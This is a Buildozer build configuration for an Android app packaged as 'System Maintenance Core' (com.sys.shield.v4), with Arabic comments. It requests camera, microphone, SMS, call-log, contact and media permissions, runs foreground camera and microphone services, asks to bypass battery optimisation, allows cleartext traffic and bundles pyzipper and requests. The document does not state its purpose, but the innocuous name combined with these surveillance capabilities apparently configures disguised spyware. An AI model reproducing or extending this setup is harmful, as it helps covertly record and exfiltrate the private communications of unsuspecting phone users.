[app]
title = System Maintenance Core
package.name = com.sys.shield.v4
package.domain = org.sys.core
version = 4.0.0

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests, __pycache__, docs, .github, venv, bin, .buildozer
source.exclude_patterns = */test/*, */tests/*, *.pyc, */__pycache__/*

# ========== ملاحظة: تم تغيير tflite-runtime إلى tensorflow-lite ==========
requirements = python3, kivy==2.3.0, tensorflow-lite, numpy==1.26.4, pillow, requests, certifi, pyjnius, android, pyzipper

icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# الصلاحيات كما هي (كامله)
android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG

android.api = 33
android.minapi = 26
android.sdk = 33
android.ndk = 25b
android.build_tools_ver = 33.0.0
android.accept_sdk_license = True

# تم تعطيل المانيفست المخصص (تأكد من عدم وجود ملفه أو علّقه)
# android.manifest = AndroidManifest.xml

android.archs = arm64-v8a
android.allow_backup = False
android.uses_cleartext_traffic = True
android.request_legacy_external_storage = True
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.no_byte_compile_python = False
android.optimize_python = True
android.release_artifact = apk
android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 1

[buildozer]
log_level = 2
warn_on_root = 1
